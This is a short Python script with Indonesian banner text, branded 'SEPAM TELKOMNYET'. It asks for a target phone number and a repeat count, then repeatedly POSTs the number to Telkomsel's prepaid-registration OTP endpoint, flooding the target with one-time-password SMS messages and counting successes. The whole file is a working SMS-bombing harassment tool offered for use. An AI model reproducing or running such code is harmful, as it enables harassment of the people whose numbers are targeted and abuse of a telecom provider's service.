#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by 🔱MAS-FERY🔱
"""
ngapai bosq? mau recode?
tinggal pake aja susah amat sih cok?!
"""
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

c=int(0)
scs=int(0)
fail=int(0)
banner=("""\033[1;36m
     _  _
   _| || |_        \033[1;32mSEPAM TELKOMNYET\033[1;36m
  |_  ..  _|
  |_      _| \033[1;31mContact=>https://t.me/ferybagus28@gmail.com\033[1;36m
    |_||_|   \033[1;31mGithub=>https://github.com/Feryoutsiders
""")

os.system('clear')
print(banner)
try:
	no = input("\033[1;37mMassukan Nomor Target =>\033[1;32m")
	tot = input("\033[1;37mJumlah Spam =>\033[1;32m")
	while ( c < int(tot) ):
		spam = {'phone':no}
		idk = ('"msg":"0"')
		r = requests.post('https://www.telkomsel.com/prepaid_registration/get_otp',data = spam)
		if str(idk) in str(r.text):
			fail+=1
			print("\033[1;31m[-] GAGAL")
		else:
			scs+=1
			print("\033[1;32m[+] SUKSES")
		
		sys.stdout.flush()
		os.popen('sleep 1')
		c+=1

except:
	exit("\033[1;31m\n[!] ERROR")
print()
print("\033[1;36mJumlah => \033[1;32mSUKSES[", scs,"] \033[1;31mGAGAL[", fail,"]")
